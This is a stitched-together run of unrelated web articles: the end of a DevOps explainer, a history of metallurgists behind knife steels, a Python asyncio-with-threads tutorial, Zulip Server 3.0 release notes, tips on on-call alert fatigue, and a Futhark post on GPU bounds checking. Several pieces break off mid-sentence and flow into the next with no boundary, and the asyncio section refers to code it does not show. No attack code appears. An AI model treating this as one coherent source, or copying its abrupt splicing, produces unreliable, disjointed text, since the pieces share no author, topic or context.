<p>These are two techniques used to manage software. Containererization, through tools such as Docker, provides a logical packaging mechanism that allows applications to be abstracted from the underlying environment they run on. Decoupling things like this allows for easy and consistent deployments of container-based applications, whether the target environment is a private data center, the public cloud or a developer’s computer. Compared to virtual machines, containers have several advantages such as reduced disk size and low overhead. Orchestration refers to practices such as automatic deployment, scaling, and management of containerized applications and can be achieved using tools such as Kubernetes.</p>
<h2 id="what-are-the-advantages-of-the-devops-model">What are the advantages of the DevOps model?</h2>
<ul>
<li>
<p>Speed. Applications developed using a microservice architecture with the addition of continuous integration allows you to release updates more frequently and to better control services.</p>
</li>
<li>
<p>Rapid delivery. Practices such as continuous integration (CI) and continuous delivery (CD) lead to faster releases and bug fixes.</p>
</li>
<li>
<p>Reliability. Thanks to CI/CD and monitoring/logging rest assured that releases will meet quality standards without sacrificing the end-user experience.</p>
</li>
<li>
<p>Scalability. Infrastructure as code allows you to manage development, testing and production environments in an iterative and more efficient way - on any scale.</p>
</li>
<li>
<p>An evolution of software architecture, development and delivery that is not the same as it was twenty years ago.</p>
</li>
</ul>
<h2 id="a-simple-pipeline-example">A simple pipeline example</h2>
<p>Now that we know about DevOps and its advantages, let’s briefly look at a simple pipeline example. There is no correct or definitive structure: you can modify the pipeline to better adapt it to certain situations or as you see fit. This is just an example.</p>
<figure>
<img src="https://garry.bhatt.al/assets/images/2020-07-16/pipeline.png" alt="DevOps pipeline">
</figure>
<p>In the first step you version the code, with a tool like Git. Developers then develop and commit the code to a repository.</p>
<p>The second step is not always necessary, it depends on the language and technology used. It consists of building the project, which often means having a working version of the project locally.</p>
<p>The third step is running unit tests on the project. This can also be automated - useful to prepare for the next step.</p>
<p>The fourth step is deployment to development/staging environments. At this point you can view the code running on an environment that can be shared with the client. This point can also be automated.</p>
<p>Subsequently, other tests can be run on the development environment. Other people responsible for testing the project can come into play by running their test tasks, even manually, on a development environment that should be complete and working. Depending on requirements, this step can also be automated.</p>
<p>If all goes well it’s time to go live! Deployment in production happens. Once this is done there is the operational/monitoring phase. Things such as applications, state of the infrastructure, errors, logs and more are kept under control.</p>
<h2 id="final-thoughts">Final Thoughts</h2>
<p>Hopefully by now you have an idea of what DevOps is, at least on paper. DevOps, as I have repeatedly stated, is first and foremost a cultural change that impacts all the figures involved in software development. In fact, it requires a different, more modern approach to software development and distribution; in return, if implemented well, it provides us with several advantages such as the reduction of different problems and timescales. It also prepares us to better face challenges that previously would have been more problematic to manage.</p>
<p>Should you find any mistake, technical or grammatical, please don’t hesitate to let me know!</p>

<p><strong>Metallurgists</strong></p>
<p>I have enjoyed writing many articles about the history of different knife steels over the past couple years of this website. It has been very challenging to track down the history of different steels to see where they came from and how. I decided to write an article about some of the greats who have made contributions to knife steel and knife tests. Many of these metallurgists didn’t know they were developing steels that would be used in knives. Some were developing tool steels or high speed steels. However, their steels have since been used in knives or their steel designs influenced other steels which have been used in knives. To keep this article manageable in size I have focused on those that developed steel or tests of knives. In other words, those that studied different aspects of steel are not included. Some notable people that were omitted for this reason include:</p>
<p>1) Marcus Grossman and Edgar Bain who discovered bainite and wrote a couple influential books on steel metallurgy</p>
<p>2) Many metallurgists who are less directly applicable but discovered many fundamentals of steel and general metallurgy, such as Henry Clifton Sorby (microscopy), Dmitry Chernov (phase transitions in steel), and William Roberts-Austen (iron-carbon phase diagram).</p>
<p>3) Metallurgists who studied heat treatment techniques. Taylor and White in the list below are a possible exception to this, however.</p>
<p>4) Influential teachers of metallurgy, some even directly to knifemakers like Kevin Cashen. Some on this list are also known for their teaching, but make the list primarily for other specific contributions.</p>
<p>So that list of categories may mean that some people you may think of as great metallurgists did not make the list. However, even with those omissions I think you will find some interesting information about the contributions of certain individuals and groups that developed the steel products we use in knives today.</p>
<p><strong>Robert Forester Mushet</strong></p>
<p>Mushet developed the first tool steel in 1868 which had several important characteristics. One was that it was the first commercially produced “alloy steel” meaning it had intentional alloy additions including manganese and tungsten to achieve certain properties, rather than being a simple carbon steel. The high tungsten in the steel gave it very high wear resistance for longer tool life. It was also the first “air hardening” steel meaning it could be allowed to cool in air from high temperature rather than quenching in oil or water. This steel was the basis of experiments from Taylor and White that led to the development of high speed steels and the explosion of development in other tool steels. Mushet is actually better known for making improvements to the “Bessemer process” which allowed the production of steel at much lower costs. But for his contributions to the future of knife steel his “Mushet steel” is huge.

<p>Mushet</p>
<p><strong>Frederick Winslow Taylor and Maunsel White</strong></p>
<p>These Bethlehem Steel metallurgists started modern steel development in many ways. Prior to their contributions, steel was heat treated in a fairly narrow temperature range, such as 1400-1600°F. Overheating would lead to grain growth and poor toughness. However, they discovered that when Mushet steel was heated to very high temperatures prior to quenching, that it could last much longer as a high speed tool, because it maintained high hardness at high speeds and therefore high temperatures. Their discovery of “high speed steel” was presented at the 1900 Paris Exhibition (a world’s fair) and led to a T1-type high speed steel by 1903. The knowledge developed and the excitement generated led to the development of many other tool steels.

<p>White</p>
<p><strong>Harry Brearley</strong></p>
<p>While there were several people working on inventing stainless steel in a similar time period, Brearley is credited with being the first to commercialize it. And what type of stainless steel did he commercialize? A knife steel! For several years afterward, stainless steel was known as being for knives and many people didn’t even realize it could be used for other things. The steel he developed was 420 stainless. This steel may have a relatively poor reputation among knife enthusiasts today, but it has been used in as many knives as any steel, perhaps the most used knife steel. And it has very good corrosion resistance. This steel was the basis for all future stainless knife steels, especially those like 420HC and AEB-L with the similar chromium content of 13%. The original name for S90V was 420V because the same chromium content of 420 was used in its development.

<p><strong>James P. Gill</strong></p>
<p>Gill was a metallurgist working for VASCO which is a company largely forgotten by knife collectors now, but made many significant contributions to tool steels. Gill developed the first commercially available high vanadium steels, such as the first 2% vanadium high speed steel in 1937 which evolved to become M2, and also M4 with its 4% vanadium and T15 with 5% vanadium. Many knife steels today continue to have high vanadium contents for improved wear resistance. Gill also wrote one of the first books on Tool Steels in 1934, which continued with new editions up until the 5th in 1998. These books on Tool Steels have been used by metallurgists for decades.

<p><strong>John A. Mathews</strong></p>
<p>Mathews worked for Crucible and Halcomb steel in the early 1900s and was highly influential for his steel developments and contributions to steel research. He patented the original T1 high speed steel with a small vanadium addition which improved the properties of early high speed steels. Vanadium additions were basically unheard of at the time but became very popular for various uses afterward. Mathews also developed the first “oil-hardening” steels including the popular O1 in 1905 which continues to be used in knives today.

<p><strong>Harry Johnstin</strong></p>
<p>Johnstin developed the steels Vasco Wear and Vasco Die in 1964. Vasco Wear is probably better known now as CruWear (Crucible branding of the same steel), though it is known by many names such as PD#1, Lescowear, and Z-Wear. Vasco Wear saw use in knives by the 70s and continues to be a popular choice in its various versions. A relatively unknown fact is that CPM-3V is in fact a powder metallurgy version of Vasco Die. Surprisingly, Crucible metallurgists were able to patent the powder metallurgy of Vasco Die despite the composition being previously patented (and expired), because the change to the microstructure and properties were deemed to be significant enough. Vasco Die and Vasco Wear also created the “8% Cr” tool steel category which became future steels like Vanadis 4 (before Vanadis 4 Extra), Vanadis 10, Sleipner, A8 Mod, DC53, Z-Tuff, CD#1, and others. You can read more about these steels in <a href="https://knifesteelnerds.com/2019/06/03/the-history-of-3v-cru-wear-and-z-tuff-steel/">this article</a>.</p>

<p><strong>David J. Giles</strong></p>
<p>David Giles was a metallurgist who developed many tool steels for Latrobe steel. Giles developed several steels which have seen use in knives, including 440A in 1926 [1]. 440A has been used extensively in consumer knives ever since, and served as the basis for the higher carbon 440C, which was incredibly popular in production and custom knives in the 70s and 80s, and continues to be used today. 154CM was originally called “440C Mod” because they reduced the Cr in 440C and replaced it with Mo. Read more about 154CM history <a href="https://knifesteelnerds.com/2018/05/21/154cm-development-properties-legacy/">in this article</a>. This 17-19% Cr base&nbsp; composition of 440A/440C served as the starting point for many future steels such as Elmax and S60V. Giles also developed 4-5% vanadium cold work steels A7 and D7 (as opposed to Gill who developed high speed steels) which served as a basis for future steels like CPM-10V. The patent-holder of 10V, Walter Haswell, previously worked at Latrobe steel and was a co-patent holder on several vanadium steels there as well, which used the same carbon-vanadium ratio equations that Giles had previously proposed [2]. D7 became Bohler’s powder metallurgy K190, which was further modified to <a href="https://knifesteelnerds.com/2020/06/15/what-is-the-best-budget-knife-steel/">develop the popular stainless M390</a>.</p>

<p>Giles</p>
<p><strong>Kenneth Pinnow and William Stasko</strong></p>
<p>These two metallurgists were prolific tool steel patenters in the 1990s and developed several significant knife steels. One is CPM-3V, previously mentioned under Harry Johnstin. They also developed S90V [3], which is popular in knives in its own right but also led to S110V which is essentially a modified S90V, developed by Al Kajinic. The biggest contribution of S90V was the discovery that using 14% Cr (as opposed to 17-18% Cr in earlier steels like S60V and Elmax), led to a better utilization of vanadium additions for improved properties. This led to a “14% Cr plus vanadium” basis for several future Crucible steels like S30V. The S90V patent also lays out how they explored different levels of nitrogen in S90V, which wasn’t really utilized in the final composition, but increased nitrogen (~0.15-0.20%) was used in S30V, S110V, and S45VN. Pinnow and Stasko also patented CPM-15V which continues to be one of the highest wear resistance steels available [4]. Stasko was also co-listed with Andrzej Wojcieszynski for patenting CPM Rex 86 and CPM Rex 121 steels [5].</p>

<p><strong>Dick Barber</strong></p>
<p>Barber is best known for developing CPM-S30V steel, which has been one of the most popular steels used in high end production knives for nearly two decades. S30V was the first steel produced by Crucible to have an intentionally increased nitrogen content of about 0.20%. S30V also served as the starting point for the popular <a href="https://knifesteelnerds.com/2020/01/13/s35vn-steel-properties-and-how-to-heat-treat/">S35VN</a>, and the more recent <a href="https://knifesteelnerds.com/2020/01/15/spyderco-exclusive-cpm-spy27-steel-analysis/">SPY27</a> and <a href="https://knifesteelnerds.com/2019/11/01/crucible-s45vn-steel/">S4…</a></p></div></div>

      <h3 id="introduction">Introduction</h3>

<p>Python <code>asyncio</code> concurrency are very good for I/O-bound tasks in Python with less overhead compared to <code>threading</code> methods. In some rare cases, since Python is a scripting language, we would like to run <code>asyncio</code> concurrency interactively in REPL (read-eval-print loop), the Python interactive shell. Because Python <code>asyncio</code> concurrency are single-process and single-thread, while they are being executed, we could not do anything in REPL but wait.</p>



<p>In this blog post, I would like to discuss how to use <code>threading</code> to control <code>asyncio</code> concurrency interactively.</p>

<h3 id="asyncio-concurrency">AsyncIO Concurrency</h3>

<h4 id="asyncio-base">AsyncIO Base</h4>

<div><div><pre><code><span>import</span> <span>asyncio</span>

<span>async</span> <span>def</span> <span>some_func</span><span>(</span><span>number</span><span>):</span>
    <span>await</span> <span>asyncio</span><span>.</span><span>sleep</span><span>(</span><span>3</span><span>)</span>
    <span>return</span> <span>number</span>

<span>async</span> <span>def</span> <span>gather_func</span><span>():</span>
    <span># Schedule three calls *concurrently*:
</span>    <span>results</span> <span>=</span> <span>await</span> <span>asyncio</span><span>.</span><span>gather</span><span>(</span>
        <span>some_func</span><span>(</span><span>1</span><span>),</span>
        <span>some_func</span><span>(</span><span>2</span><span>),</span>
        <span>some_func</span><span>(</span><span>3</span><span>),</span>
    <span>)</span>
    <span>return</span> <span>results</span>

<span># Use asyncio high-level API
</span><span>results</span> <span>=</span> <span>asyncio</span><span>.</span><span>run</span><span>(</span><span>gather_func</span><span>())</span>

<span>print</span><span>(</span><span>results</span><span>)</span>
</code></pre></div></div>

<p>If running this script in the REPL, we would have to wait three seconds after executing <code>results = asyncio.run(gather_func())</code> before we could execute <code>print(results)</code>. In some use cases, if it is requesting something from a remote server, it might have a chance to take forever, and we have to press <code>Ctrl</code> + <code>C</code> to kill.</p>

<h4 id="asyncio-timeout">AsyncIO Timeout</h4>

<p>If we don’t like waiting too long for the <code>asyncio</code> concurrency, we have options to timeout.</p>

<div><div><pre><code><span>import</span> <span>asyncio</span>

<span>async</span> <span>def</span> <span>some_func</span><span>(</span><span>number</span><span>):</span>
    <span>await</span> <span>asyncio</span><span>.</span><span>sleep</span><span>(</span><span>3</span><span>)</span>
    <span>return</span> <span>number</span>

<span>async</span> <span>def</span> <span>gather_func</span><span>():</span>
    <span># Schedule three calls *concurrently*:
</span>    <span>results</span> <span>=</span> <span>await</span> <span>asyncio</span><span>.</span><span>gather</span><span>(</span>
        <span>some_func</span><span>(</span><span>1</span><span>),</span>
        <span>some_func</span><span>(</span><span>2</span><span>),</span>
        <span>some_func</span><span>(</span><span>3</span><span>),</span>
    <span>)</span>
    <span>return</span> <span>results</span>

<span>async</span> <span>def</span> <span>main</span><span>():</span>
    <span># Schedule three calls *concurrently*:
</span>    <span>try</span><span>:</span>
        <span>results</span> <span>=</span> <span>await</span> <span>asyncio</span><span>.</span><span>wait_for</span><span>(</span><span>gather_func</span><span>(),</span> <span>timeout</span><span>=</span><span>None</span><span>)</span> <span># Try toggle timeout between 1 and None.
</span>    <span>except</span> <span>asyncio</span><span>.</span><span>TimeoutError</span><span>:</span>
        <span>print</span><span>(</span><span>"timeout!"</span><span>)</span>
    <span>return</span> <span>results</span>

<span># Use asyncio high-level API
</span><span>results</span> <span>=</span> <span>asyncio</span><span>.</span><span>run</span><span>(</span><span>main</span><span>())</span>

<span>print</span><span>(</span><span>results</span><span>)</span>
</code></pre></div></div>

<p>If running this script in the REPL, even if we used <code>asyncio.wait_for</code> with <code>timeout</code>, we could not do anything but wait during the <code>asyncio</code> concurrency. In addition, we have to set a fixed <code>timeout</code> value before we start the <code>asyncio</code> concurrency. We could not change our mind during waiting, unless we press <code>Ctrl</code> + <code>C</code> to kill.</p>

<h4 id="asyncio--thread">AsyncIO + Thread</h4>

<p>If we have two Python threads, one thread is responsible for the <code>asyncio</code> event loop which is take care of the concurrency schedules at the low-level, and the other one thread is responsible for the user interactive activities while still having control access to the <code>asyncio</code> concurrency.</p>

<p>Now, we could check and cancel <code>asyncio</code> concurrency anytime during its execution. However, there are a drawback of this method. The <code>concurrent.futures.Future</code> represents the status of coroutine running in the event loop. The coroutine might contain many tasks, but we will not be able to have access to any of them individually in another thread.</p>



<p>To overcome this, instead of merging multiple tasks into one single task, we could call <code>run_coroutine_threadsafe</code> multiple times for individual <code>coroutine</code>s and get multiple <code>future</code>s to control them individually.</p>

<img src="https://blog.zulip.com/content/images/2020/07/16102948y9dIHsQN-2.png"></p><!--kg-card-end: markdown--><p>Zulip Server 3.0 contains major visual design improvements, dramatic scalability and performance improvements, a new logo, and several of Zulip's most requested features to help users efficiently read, skim, search, and refer back to their messages. Zulip is 100% free and open-source software, and ships with translations for 16 languages.</p><p>Zulip 3.0 is our largest release ever, with over 4100 new commits since December's Zulip 2.1 release. A total of 110 people contributed commits to Zulip 3.0, bringing <a href="https://github.com/zulip/zulip/">the Zulip server project</a> to 619 distinct code contributors. With <a href="https://zulip.com/team">54 people</a> who’ve contributed 100+ commits, Zulip has by far the most active open-source development community of any team chat software.</p><p>Huge thanks to everyone who's contributed to Zulip over the last few months, whether by writing code and docs, reporting issues, testing changes, translating, posting feedback on <a href="https://zulip.readthedocs.io/en/latest/contributing/chat-zulip-org.html">chat.zulip.org</a>, or just suggesting ideas! We could not do this without the hundreds of people giving back to the Zulip community.</p><h2 id="project-highlights"><strong>Project highlights</strong></h2><p>Today marks a release of the Zulip server, but lots of exciting work has happened outside the server codebase over the last several months as well. Highlights include:</p><ul><li>Zulip has experienced an extraordinary increase in usage in 2020 as a result of the ongoing pandemic changing how people work. &nbsp;It's been incredibly gratifying to <a href="https://monadical.com/posts/how-to-make-remote-work-part-two-zulip.html">hear from users</a> about how Zulip has helped them make remote work, conferences, teaching, and meetups successful. &nbsp;We now sponsor free Zulip Cloud Standard hosting for hundreds of worthy <a href="https://zulip.com/for/open-source/">open-source projects</a>, non-profits, <a href="https://zulip.com/for/research/">research groups</a>, and similar non-commercial organizations. &nbsp;New organizations can apply during the <a href="https://zulip.com/new">signup flow</a> or on the billing page.</li><li>Zulip Cloud has introduced <a href="https://blog.zulip.com/2020/05/27/zulip-responds-to-pandemic-with-60-day-free-trial/">60-day free trials</a> for commercial users to help ensure that budget freezes aren't a barrier to experimenting with Zulip. &nbsp;Zulip has robust data import tools for <a href="https://zulip.com/help/import-from-slack">Slack</a>, <a href="https://zulip.com/help/import-from-mattermost">Mattermost</a>, and <a href="https://zulip.com/help/import-from-gitter">Gitter</a>.</li><li>Zulip has a new logo!

Instead of doing gymnastics to clearly communicate a meeting time to an audience across the globe, you can <a href="https://zulipchat.com/help/format-your-message-using-markdown#mention-a-time" rel="noreferrer nofollow noopener">use a date picker to write a time</a> which Zulip will show in each reader’s own timezone.</li><li>Zulip’s markup now supports <a href="https://zulipchat.com/help/format-your-message-using-markdown#spoilers" rel="noreferrer nofollow noopener">spoiler blocks</a>.</li><li><a href="https://zulipchat.com/help/quote-and-reply" rel="noreferrer nofollow noopener">Quote-and-reply</a> now generates a handy link to the referenced message.</li></ul><p><strong>Server</strong></p><ul><li>This release adds support for Ubuntu 20.04 Focal, and ends support for Ubuntu 16.04 Xenial and Debian 9 Stretch (both of which were based on Python 3.5, which reaches EOL in September). See our documentation for <a href="https://zulip.readthedocs.io/en/latest/production/upgrade-or-modify.html#upgrading-the-operating-system" rel="noreferrer nofollow noopener">upgrading the operating system</a>.</li><li>Zulip now defaults to using PostgreSQL 12 on new installs, with support for PostgreSQL 10–12. (Previously, Zulip always used whatever PostgreSQL version came with the base OS release.) This release also adds a convenient new tool to <a href="https://zulip.readthedocs.io/en/latest/production/upgrade-or-modify.html#upgrading-postgresql" rel="noreferrer nofollow noopener">upgrade </a><a href="https://zulip.readthedocs.io/en/latest/production/upgrade-or-modify.html#upgrading-the-operating-system" rel="noreferrer nofollow noopener">PostgreSQL</a>.</li><li>Numerous major performance improvements. Zulip’s server-to-client push system scales 4x better than in Zulip 2.x, and several of the most common queries are much faster. Performance has improved dramatically for organizations like our own Zulip development community with 10,000s of user accounts.</li><li>We upgraded Django from 1.11.x to the latest LTS series, 2.2.x. We continue to love how every major Django release comes with great features that we hadn't realized we needed!</li><li>We're moving to a new versioning scheme with only 2 digits; the next maintenance release will be Zulip Server 3.1 and the next major release will be Zulip Server 4.0.</li></ul><p><strong>API and API Documentation</strong></p><ul><li>Zulip’s <a href="https://zulip.com/api" rel="noreferrer nofollow noopener">REST API documentation</a> received a major overhaul both of content and presentation. Most importantly, our automated tests now validate every API request, response, and example against the OpenAPI schemas used to generate the API documentation. Because the Zulip server has nearly 100% test coverage, this ensures the API documentation is always consistent with the implementation.</li><li>Zulip now has <a href="https://zulip.com/api/changelog" rel="noreferrer nofollow noopener">a detailed API changelog</a> which documents exactly when each API change was introduced. The <code>zulip_feature_level</code> field in <a href="https://zulipchat.com/api/get-server-settings" rel="noreferrer nofollow noopener">the server settings API</a> (which is more fine-grained than a server release), when combined with the changelog, allows client applications to know exactly what any given Zulip server supports.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>What is alert fatigue, and why should I care?</h3><p>Alert fatigue, or pager fatigue, is something that can drastically reduce even the most seasoned team’s ability to respond to incidents. This is the effect of receiving too many alerts, either because there are simply too many incidents occurring, or because your monitoring is picking up on insignificant issues and notifying you for things that do not require your attention (also known as alert noise). This can lower your team’s cognitive ability and capacity, making incident response a slow, difficult process. It can also lead your team to ignore crucial alerts, resulting in major incidents going unresolved or unnoticed until it’s too late.<br></p><p>A good parallel for understanding alert fatigue during an on-call rotation is that of the medical community. Reports have been written on the danger of allowing alerts to run your team. In an article in the <em>Journal of Graduate Medical Education</em>, Jess L. Rush et al states, “A large number of irrelevant alerts may result in alert fatigue... which may result in critical warnings being missed. The ECRI Institute, a nonprofit medical safety organization, listed alert fatigue as a top technology hazard. The consequences are illustrated when a child received 38 times the normal dose of an antibiotic largely due to this information being overshadowed by a number of clinically inconsequential alerts.”<br></p><p>In the worst case scenario, alert fatigue can be deadly. In our day-to-day operation, it’s more like death by a thousand cuts, rather than one fatal wound. However, the results are still the same; alert fatigue can wear down your team. It’s important to minimize alert or pager fatigue as much as possible, for the health and well being of your team members. After all, the health of your systems is dependent on the health of your people.&nbsp;<br></p><p>Here are 5 tips on how to cut down on alert fatigue and improve your signal-to-noise ratio.</p><h3>Encourage service ownership</h3><p>Service ownership can help cut down on the amount of alerts you get, simply because it’s a way to help improve service robustness and minimize repetitive incidents. Service ownership can help:<br></p><ul role="list"><li><strong>Prevent code from being “thrown over the wall” and encourage learning. </strong>When developers are responsible for owning the services they build, it encourages better practices around shipping performant code. It’s easy to overlook potential flaws in your code when you’re not the one supporting the service, and focusing on reliability over shipping new features doesn’t seem as important when you’re not the one being paged over the weekend. But when service ownership is encouraged, developers will begin scrutinizing their code more thoroughly. Additionally, action items and learnings from incidents are more likely to be fed back into the software lifecycle (SDLC) when developers are in the loop on what issues are occurring.</li><li><strong>Keep teams under pressure from burning out by sharing the load. </strong>If your traditional ops team is up every night, working 70-hour work weeks and spending every weekend with their laptop, it should come as no surprise that eventually productivity will falter. People need breaks and time away from work. Without that time to themselves, teams under pressure will be susceptible to burnout. Management will be stuck in a cycle of hiring and training for roles they filled just a few months ago. Service ownership helps spread the on-call responsibilities out so that everyone has a turn carrying the pager. This can also have the unexpected benefit of familiarizing on-call engineers with their product a little more, as they’ll have to triage it during incidents. Service ownership helps balance on-call to keep engineers practiced and prepared.&nbsp;<strong>‍</strong></li><li><strong>Create the same incentive for everyone, limiting siloes. </strong>Service ownership can also help ease the tension between innovation and reliability, and will encourage even heavily siloed organizations to talk between teams in order to prioritize feature work and reliability work better. Everyone wants to move fast, sleep well, and have strong enough systems that they aren’t alerted about an issue every time they check their phone.</li></ul><h3>Create runbooks for your alerts</h3><p>What happens when you receive a notification that something is wrong with your system and you have no clue what it means, or why you’re receiving that alert? Maybe you have to parse through the alert conditions to suss out what the alert indicates, or maybe you need to ping a coworker and ask. Not knowing what to do with an alert also contributes to alert fatigue, because it increases the toil and time required to respond.<br></p><p>To resolve this, make sure that you create runbooks for the alert conditions you set. These runbooks should explain why you received this alert and what the alert is monitoring. <a href="https://www.blameless.com/blog/runbook-automation-best-practices">Runbooks </a>should also contain the below information:<br></p><ol role="list"><li><strong>Map of your system architecture:</strong> You’ll need to understand how each service functions and connects. This can help your on-call team have better visibility into dependencies that might be what ultimately triggers an alert.</li><li><strong>Service owners: </strong>This gives you someone to contact in the event that the alert is still not making sense, or the incident requires a technical expert for the service affected.</li><li><strong>Key procedures and checklist tasks: </strong>Checklists can give on-call engineers a place to start when looking into an alert. This helps preserve cognitive capacity for resolving the actual issue behind the alert.</li><li><strong>Identify methods to </strong><a href="https://www.blameless.com/blog/runbook-automation-best-practices"><strong>bake into automation:</strong></a><strong> </strong>Does this alert actually require human intervention? If not, add in scripts that can handle this alert and which notify you only if the automation cannot fix the issue for you.</li><li><strong>Continue refining, learning, and improving: </strong>Runbooks are next to worthless if they aren't up to date. When you revisit these to make updates, take the opportunity to learn from them again, looking for new opportunities to automate and optimize.<br></li></ol><p>Runbooks can be a huge help to on-call engineers, but&nbsp; they need to be made easily accessible to the right people on the front lines. In addition to making sure your team has all the information they need to deal with alerts while on-call, it’s also important to take a deeper look at the on-call schedule you maintain.</p><blockquote>Maybe you have to parse through the alert conditions to suss out what the alert indicates, or maybe you need to ping a coworker and ask. Not knowing what to do with an alert also contributes to alert fatigue, because it increases the toil and time required to respond.</blockquote><h3>Take a closer look at your on-call schedule</h3><p>Maybe you don’t have superfluous alerts or an overwhelming amount of incidents to tackle, but some of your team members are constantly burning the midnight oil and experiencing alert fatigue. This is likely an issue of improper load balancing of&nbsp; the on-call schedule, rotation, and escalation policies.<br></p><p>One way to make sure that your on-call schedule minimizes alert fatigue is to take a qualitative approach rather than a quantitative one. Imagine you have two engineers. <strong>Engineer A</strong> spends a full week on call and receives notifications twice about suboptimal service function. Each alert triggers an incident which requires an hour to resolve.<br></p><p><strong>Engineer B</strong> spends only a weekend on call and receives seven notifications. Three of those seven are deemed irrelevant (more on how to limit this later!), and the other four trigger incidents which take two hours each to resolve.<br></p><p>Who should be on call next? And who needs a break? By measuring time spent on call, it would seem that <strong>Engineer A</strong> needs a break. However, it’s <strong>Engineer B </strong>who is spending more time directly dealing with interrupt work, and likely more stressed by alert fatigue. By taking a proactive and qualitative approach, managers can anticipate burnout and fatigue before it becomes an issue.</p><p>In addition to looking at who is on call, you should also be checking in on those who were pinged on their day off to help. You may notice that some grey beards on your team are answering calls when they shouldn’t have to. In this case, you’ll need to work to <a href="https://www.blameless.com/resources/business-continuity-guide">eliminate SPOFs</a> (single points of failure), and train your on-call engineers so that when they’re scheduled to handle the pager, they don’t need to always phone a friend.</p><h3>Set SLOs to create guidelines for alerts</h3><p>Sometimes the problem isn’t that you have too many incidents; instead it could just be that you’re alerting on the wrong things, or set the wrong alerting thresholds. To minimize alert fatigue, it’s important to distinguish what is worth alerting on and what isn’t. One way to do this is with SLOs.<br></p><p><a href="https://www.blameless.com/blog/service-level-objectives-slos-lessons-learned">SLOs</a> are internal thresholds that allow teams to guard their customer satisfaction. These thresholds are set based on <a href="https://www.blameless.com/blog/slis-understand-users-needs">SLIs</a>, or singular metrics captured by the service’s monitorable data. SLIs take into account points on a user journey that are most important to a customer, such as latency, availability, throughput, or freshness of the data at certain junctions. These metrics (stated as good events/valid events over a period of time) indicate what your customers will care most about. SLOs are the objectives that you must meet to keep them happy.<br></p><p>Imagine that your service is an online shopping platform. Your customers care most about availability. In this case, you’ve determined that to keep customers happy, your service requires 99.9% availability. That means you can only have 43.83 minutes of downtime per month before customer happiness will be affected.<br></p><p>Based on this, you have wiggle room for planned maintenance or shipping new features that might risk a potential blip. But how much wiggle room are you comfortable with? An error budget policy is an agreement that all stakeholders make on what will be done in the event an SLO is threatened.<br></p><p>So imagine that out of your 43.83 minutes, you’ve used 21 minutes. Do you need minute-by minute alerts? Not likely. Instead, you’ll want to set up alerting thresholds that let you know when you’ve reached certain milestones such as 25%, 50%, 75%, and so on. Maybe you even automate these alerts so …</p></div></div>

    Posted on July 13, 2020
    
        by Troels Henriksen
    
</p>

<p>Futhark is supposed to be a safe programming language. This implies that risky operations, such as <code>a[i]</code> which indexes an array at some arbitrary index, should be protected with a dynamic check. While C programmers are famous for never making mistakes, and therefore C does not perform do such checking, the vast majority of programming languages do check array indexes, usually by generating code like this:</p>
<pre><code>if (i &lt; 0 || i &gt; n) {
  // throw exception

  // OR print error message

  // OR terminate program

  // OR do anything else
}</code></pre>
<p>This immediately changes the control flow of the program based on the bounds check. Usually the implementation challenge is not how to perform such checks in the first place, but how to eliminate them in cases where the compiler can statically determine that the check can never fail. However, for Futhark we would like to generate code for GPUs, and GPUs are great at turning solved problems unsolved.</p>
<p>In this post I will describe why it took Futhark <em>years</em> to get support for bounds-checking on the GPU, how we recently solved the problem, and what the performance is like. This post is a rewritten extract of a <a href="https://futhark-lang.org/publications/hlpp20.pdf">recently presented paper</a>, which you can read if you are particularly interested in the details of bounds checking.</p>
<h2 id="asynchronous-execution"><a href="#asynchronous-execution" id="asynchronous-execution-link" title="asynchronous-execution">Asynchronous execution</a></h2>
<p>The basic problem is that the GPU functions as a <em>co-processor</em> that receives data and code from the CPU, but which is then processed at the GPUs own pace. Explicit synchronisation and copying (both slow) is necessary to exchange information between the CPU and GPU.</p>
<p>GPU code is organised as <em>kernels</em> (no relation to operating systems, more like functions), and when we launch code on the GPU, we tell it to run a specific kernel with a specific number of threads, with some specific arguments. It’s a lot like performing an asynchronous remote procedure call. And similarly to a remote procedure, a kernel that contains an index that is out of bounds has no way of directly affecting the control flow of the CPU. In practice, our only option is to simply write a value to a distinguished memory location indicating that things have gone wrong, and then terminate the running GPU thread:</p>
<pre><code>if (i &lt; 0 || i &gt;= n) {
  *global_failure = 1;
  return;  // Terminate GPU thread
}</code></pre>
<p>On the CPU, whenever we launch a GPU kernel, we then <em>block</em> until the kernel is done running, copy back the <code>global_failure</code> value, and check whether a bounds error occurred:</p>
<p><img src="https://futhark-lang.org/images/2020-07-13-gpu-cpu-sync.png" alt="A diagram of checking for errors after every GPU kernel."></p>
<p>Surely reading a single number after every kernel (which usually processes tens of thousands of array elements) must be fast? Let’s check the overhead on the Futhark benchmark suite, measured on an RTX 2080 Ti GPU:</p>
<p><img src="https://futhark-lang.org/images/2020-07-13-overhead-sync.png" alt="Slowdown of synchronous bounds checking compared to no bounds checking."></p>
<p>The vertical axis shows the <em>slowdown</em> of synchronous bounds checking compared to not doing any bounds checking. The overhead is pretty bad: A <a href="https://en.wikipedia.org/wiki/Geometric_mean">geomean</a> of <em>1.66x</em> , and more than <em>6x</em> on the worst affected benchmarks. I’m only measuring those benchmarks that require bounds checking <em>at all</em>, so the mean overhead across all benchmarks would be lower. Still, this is too slow to be practical.</p>
<p>GPUs perform well when given a large queue of work to process at their own pace, not when they constantly stop to transfer 32 bits back to the CPU for inspection, and have to wait for a go-ahead before proceeding. To speed this up, we need to cut the amount of synchronisation.</p>
<p>Let’s take a step back and consider why we do bounds checking in the first place: we want to avoid corrupting memory by writing to invalid addresses, and we want to avoid making bad control flow decisions based on reading garbage. This implies that we have to do bounds checking <em>immediately</em> whenever we access an array. But since the GPU’s control flow is completely decoupled from what is happening on the CPU, the CPU doesn’t actually need to know immediately that something has gone wrong - it only needs to be informed when it eventually copies data from the GPU, so that it knows not to trust it. The actual <em>check</em> still needs to be done immediately on the GPU, but copying back <code>global_failure</code> to the CPU can wait until the CPU would in any case need to synchronise with the GPU:</p>
<p><img src="https://futhark-lang.org/images/2020-07-13-gpu-cpu-async.png" alt="A diagram of delaying error checking."></p>
<p>This amortises the copying overhead over potentially many kernel launches. But we’re still not quite done, as kernel <em>i+1</em> may contain unchecked operations that are safe if and only if the preceding kernel <em>i</em> completed successfully. To address this, we add a prelude to every GPU kernel body where each thread checks whether <code>global_failure</code> is set:</p>
<pre><code>// Prelude added to every GPU kernel
if (*global_failure) {
  return;
}</code></pre>
